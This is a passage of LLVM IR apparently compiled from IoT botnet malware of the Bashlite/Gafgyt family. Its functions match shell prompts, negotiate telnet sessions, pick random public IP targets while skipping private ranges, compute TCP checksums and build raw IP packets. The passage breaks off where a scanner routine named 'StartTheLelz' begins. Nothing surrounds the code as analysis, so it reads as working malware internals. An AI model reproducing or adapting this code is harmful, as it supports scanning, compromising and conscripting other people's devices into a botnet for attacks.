.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %16 = sext i32 %.1.lcssa to i64
  %17 = sub nsw i64 0, %16
  %18 = getelementptr inbounds i8, i8* %4, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %19, 58
  br i1 %20, label %21, label %.preheader.137

; <label>:21:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.preheader.1:                               ; preds = %.preheader.137
  %22 = sext i32 %.1.lcssa to i64
  br label %.lr.ph.1

.lr.ph.1:                                         ; preds = %.critedge1.1, %.lr.ph.preheader.1
  %indvars.iv.1 = phi i64 [ %22, %.lr.ph.preheader.1 ], [ %indvars.iv.next.1, %.critedge1.1 ]
  %.130.1 = phi i32 [ %.1.lcssa, %.lr.ph.preheader.1 ], [ %27, %.critedge1.1 ]
  %23 = sub nsw i64 0, %indvars.iv.1
  %24 = getelementptr inbounds i8, i8* %6, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = trunc i64 %indvars.iv.1 to i32
  switch i8 %25, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %27 = add nsw i32 %.130.1, 1
  %28 = icmp sgt i64 %7, %indvars.iv.next.1
  br i1 %28, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %26, %.lr.ph.1 ], [ %27, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %29 = sext i32 %.1.lcssa.1 to i64
  %30 = sub nsw i64 0, %29
  %31 = getelementptr inbounds i8, i8* %4, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 62
  br i1 %33, label %21, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %34 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %34, label %.lr.ph.preheader.2, label %.critedge.2

.lr.ph.preheader.2:                               ; preds = %.preheader.238
  %35 = sext i32 %.1.lcssa.1 to i64
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.critedge1.2, %.lr.ph.preheader.2
  %indvars.iv.2 = phi i64 [ %35, %.lr.ph.preheader.2 ], [ %indvars.iv.next.2, %.critedge1.2 ]
  %.130.2 = phi i32 [ %.1.lcssa.1, %.lr.ph.preheader.2 ], [ %40, %.critedge1.2 ]
  %36 = sub nsw i64 0, %indvars.iv.2
  %37 = getelementptr inbounds i8, i8* %6, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = trunc i64 %indvars.iv.2 to i32
  switch i8 %38, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %40 = add nsw i32 %.130.2, 1
  %41 = icmp sgt i64 %7, %indvars.iv.next.2
  br i1 %41, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %39, %.lr.ph.2 ], [ %40, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %42 = sext i32 %.1.lcssa.2 to i64
  %43 = sub nsw i64 0, %42
  %44 = getelementptr inbounds i8, i8* %4, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 37
  br i1 %46, label %21, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %47 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %47, label %.lr.ph.preheader.3, label %.critedge.3

.lr.ph.preheader.3:                               ; preds = %.preheader.339
  %48 = sext i32 %.1.lcssa.2 to i64
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.critedge1.3, %.lr.ph.preheader.3
  %indvars.iv.3 = phi i64 [ %48, %.lr.ph.preheader.3 ], [ %indvars.iv.next.3, %.critedge1.3 ]
  %.130.3 = phi i32 [ %.1.lcssa.2, %.lr.ph.preheader.3 ], [ %53, %.critedge1.3 ]
  %49 = sub nsw i64 0, %indvars.iv.3
  %50 = getelementptr inbounds i8, i8* %6, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = trunc i64 %indvars.iv.3 to i32
  switch i8 %51, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %53 = add nsw i32 %.130.3, 1
  %54 = icmp sgt i64 %7, %indvars.iv.next.3
  br i1 %54, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %52, %.lr.ph.3 ], [ %53, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %55 = sext i32 %.1.lcssa.3 to i64
  %56 = sub nsw i64 0, %55
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = icmp eq i8 %58, 36
  br i1 %59, label %21, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %60 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %60, label %.lr.ph.preheader.4, label %.critedge.4

.lr.ph.preheader.4:                               ; preds = %.preheader.440
  %61 = sext i32 %.1.lcssa.3 to i64
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.critedge1.4, %.lr.ph.preheader.4
  %indvars.iv.4 = phi i64 [ %61, %.lr.ph.preheader.4 ], [ %indvars.iv.next.4, %.critedge1.4 ]
  %.130.4 = phi i32 [ %.1.lcssa.3, %.lr.ph.preheader.4 ], [ %66, %.critedge1.4 ]
  %62 = sub nsw i64 0, %indvars.iv.4
  %63 = getelementptr inbounds i8, i8* %6, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = trunc i64 %indvars.iv.4 to i32
  switch i8 %64, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %66 = add nsw i32 %.130.4, 1
  %67 = icmp sgt i64 %7, %indvars.iv.next.4
  br i1 %67, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %65, %.lr.ph.4 ], [ %66, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %68 = sext i32 %.1.lcssa.4 to i64
  %69 = sub nsw i64 0, %68
  %70 = getelementptr inbounds i8, i8* %4, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = icmp eq i8 %71, 35
  %. = zext i1 %72 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #0 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  br label %26

; <label>:26:                                     ; preds = %.lr.ph, %.backedge
  %.03335 = phi i32 [ %7, %.lr.ph ], [ %44, %.backedge ]
  %27 = load i64, i64* %12, align 8
  %28 = icmp sgt i64 %27, 0
  %29 = load i64, i64* %14, align 8
  %30 = icmp sgt i64 %29, 0
  %31 = or i1 %28, %30
  br i1 %31, label %32, label %.critedge.loopexit

; <label>:32:                                     ; preds = %26
  %33 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #5, !srcloc !3
  %34 = load i64, i64* %23, align 8
  %35 = or i64 %34, %20
  store i64 %35, i64* %23, align 8
  %36 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #5
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.critedge.loopexit, label %38

; <label>:38:                                     ; preds = %32
  %39 = sext i32 %.03335 to i64
  %40 = getelementptr inbounds i8, i8* %5, i64 %39
  %41 = call i64 @recv(i32 %0, i8* %40, i64 1, i32 0) #5
  %42 = trunc i64 %41 to i32
  switch i32 %42, label %43 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:43:                                     ; preds = %38
  %44 = add nsw i32 %42, %.03335
  %45 = load i8, i8* %40, align 1
  %46 = icmp eq i8 %45, -1
  br i1 %46, label %47, label %53

; <label>:47:                                     ; preds = %43
  %48 = getelementptr inbounds i8, i8* %40, i64 1
  %49 = call i64 @recv(i32 %0, i8* %48, i64 2, i32 0) #5
  %50 = trunc i64 %49 to i32
  switch i32 %50, label %51 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:51:                                     ; preds = %47
  %52 = call i32 @negotiate(i32 %0, i8* nonnull %40, i32 undef)
  br label %.critedge

; <label>:53:                                     ; preds = %43
  %54 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %55 = icmp eq i8* %54, null
  br i1 %55, label %56, label %.critedge.loopexit

; <label>:56:                                     ; preds = %53
  br i1 %25, label %.backedge, label %59

.backedge:                                        ; preds = %56, %59
  %57 = add nsw i32 %44, 2
  %58 = icmp slt i32 %57, %6
  br i1 %58, label %26, label %.critedge.loopexit

; <label>:59:                                     ; preds = %56
  %60 = call i32 @matchPrompt(i8* nonnull %5)
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.backedge, %26, %32, %59, %53, %38, %38
  %.0.ph = phi i32 [ 0, %38 ], [ 0, %38 ], [ 1, %53 ], [ 1, %59 ], [ 0, %32 ], [ 0, %26 ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %8, %47, %47, %51
  %.0 = phi i32 [ 0, %51 ], [ 0, %47 ], [ 0, %47 ], [ 0, %8 ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #0 {
  %1 = alloca [16 x i8], align 16
  %2 = alloca [16 x i8], align 16
  %3 = load i8, i8* @ipState.1, align 1
  %4 = icmp eq i8 %3, 0
  br i1 %4, label %20, label %5

; <label>:5:                                      ; preds = %0
  %6 = load i8, i8* @ipState.4, align 1
  %7 = icmp eq i8 %6, -1
  br i1 %7, label %20, label %8

; <label>:8:                                      ; preds = %5
  %9 = add i8 %6, 1
  store i8 %9, i8* @ipState.4, align 1
  %10 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %10, i8 0, i64 16, i32 16, i1 false)
  %11 = load i8, i8* @ipState.1, align 1
  %12 = zext i8 %11 to i32
  %13 = load i8, i8* @ipState.2, align 1
  %14 = zext i8 %13 to i32
  %15 = load i8, i8* @ipState.3, align 1
  %16 = zext i8 %15 to i32
  %17 = load i8, i8* @ipState.4, align 1
  %18 = zext i8 %17 to i32
  %19 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %10, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i64 0, i64 0), i32 %12, i32 %14, i32 %16, i32 %18)
  br label %88

; <label>:20:                                     ; preds = %5, %0
  %21 = tail call i32 @rand() #5
  %22 = srem i32 %21, 255
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* @ipState.1, align 1
  %24 = tail call i32 @rand() #5
  %25 = srem i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* @ipState.2, align 1
  %27 = tail call i32 @rand() #5
  %28 = srem i32 %27, 255
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* @ipState.3, align 1
  store i8 0, i8* @ipState.4, align 1
  br label %30

; <label>:30:                                     ; preds = %.critedge, %20
  %31 = load i8, i8* @ipState.1, align 1
  switch i8 %31, label %36 [
    i8 0, label %.critedge
    i8 10, label %.critedge
    i8 100, label %32
  ]

; <label>:32:                                     ; preds = %30
  %33 = load i8, i8* @ipState.2, align 1
  %34 = icmp ugt i8 %33, 63
  %35 = icmp sgt i8 %33, -1
  %or.cond = and i1 %34, %35
  br i1 %or.cond, label %.critedge, label %thread-pre-split

thread-pre-split:                                 ; preds = %32
  %.pr = load i8, i8* @ipState.1, align 1
  br label %36

; <label>:36:                                     ; preds = %thread-pre-split, %30
  %37 = phi i8 [ %.pr, %thread-pre-split ], [ %31, %30 ]
  switch i8 %37, label %41 [
    i8 127, label %.critedge
    i8 -87, label %38
  ]

; <label>:38:                                     ; preds = %36
  %39 = load i8, i8* @ipState.2, align 1
  %40 = icmp eq i8 %39, -2
  br i1 %40, label %.critedge, label %41

; <label>:41:                                     ; preds = %36, %38
  %42 = load i8, i8* @ipState.1, align 1
  %43 = icmp eq i8 %42, -84
  %44 = load i8, i8* @ipState.2, align 1
  %45 = icmp ult i8 %44, 17
  %or.cond14 = and i1 %43, %45
  br i1 %or.cond14, label %.critedge, label %46

; <label>:46:                                     ; preds = %41
  %47 = icmp eq i8 %42, -64
  %48 = icmp eq i8 %44, 0
  %or.cond16 = and i1 %47, %48
  %49 = load i8, i8* @ipState.3, align 1
  %50 = icmp eq i8 %49, 2
  %or.cond18 = and i1 %or.cond16, %50
  br i1 %or.cond18, label %.critedge, label %51

; <label>:51:                                     ; preds = %46
  %52 = icmp eq i8 %44, 88
  %or.cond20 = and i1 %47, %52
  %53 = icmp eq i8 %49, 99
  %or.cond22 = and i1 %or.cond20, %53
  %54 = icmp eq i8 %44, -88
  %or.cond24 = and i1 %47, %54
  %or.cond35 = or i1 %or.cond24, %or.cond22
  br i1 %or.cond35, label %.critedge, label %55

; <label>:55:                                     ; preds = %51
  %56 = icmp eq i8 %42, -58
  %57 = and i8 %44, -2
  %switch = icmp eq i8 %57, 18
  %or.cond36 = and i1 %56, %switch
  br i1 %or.cond36, label %.critedge, label %58

; <label>:58:                                     ; preds = %55
  %59 = load i8, i8* @ipState.1, align 1
  %60 = icmp eq i8 %59, -58
  %61 = load i8, i8* @ipState.2, align 1
  %62 = icmp eq i8 %61, 51
  %or.cond26 = and i1 %60, %62
  %63 = load i8, i8* @ipState.3, align 1
  %64 = icmp eq i8 %63, 100
  %or.cond28 = and i1 %or.cond26, %64
  br i1 %or.cond28, label %.critedge, label %65

; <label>:65:                                     ; preds = %58
  %66 = icmp eq i8 %59, -53
  %67 = icmp eq i8 %61, 0
  %or.cond30 = and i1 %66, %67
  %68 = icmp eq i8 %63, 113
  %or.cond32 = and i1 %or.cond30, %68
  %69 = icmp ugt i8 %59, -33
  %or.cond34 = or i1 %69, %or.cond32
  br i1 %or.cond34, label %.critedge, label %79

.critedge:                                        ; preds = %55, %65, %58, %51, %46, %41, %36, %32, %30, %30, %38
  %70 = tail call i32 @rand() #5
  %71 = srem i32 %70, 255
  %72 = trunc i32 %71 to i8
  store i8 %72, i8* @ipState.1, align 1
  %73 = tail call i32 @rand() #5
  %74 = srem i32 %73, 255
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* @ipState.2, align 1
  %76 = tail call i32 @rand() #5
  %77 = srem i32 %76, 255
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* @ipState.3, align 1
  br label %30

; <label>:79:                                     ; preds = %65
  %80 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %80, i8 0, i64 16, i32 16, i1 false)
  %81 = load i8, i8* @ipState.1, align 1
  %82 = zext i8 %81 to i32
  %83 = load i8, i8* @ipState.2, align 1
  %84 = zext i8 %83 to i32
  %85 = load i8, i8* @ipState.3, align 1
  %86 = zext i8 %85 to i32
  %87 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %80, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.25, i64 0, i64 0), i32 %82, i32 %84, i32 %86)
  br label %88

; <label>:88:                                     ; preds = %79, %8
  %.sink = phi i8* [ %80, %79 ], [ %10, %8 ]
  %89 = call i32 @inet_addr(i8* %.sink) #5
  ret i32 %89
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #0 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #18
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !4

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #0 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %10 = tail call noalias i8* @malloc(i64 44) #5
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #5
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #1

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #4 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #0 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #5
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @StartTheLelz() local_unnamed_addr #12 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca %struct.timeval, align 8
  %3 = alloca i32, align 4
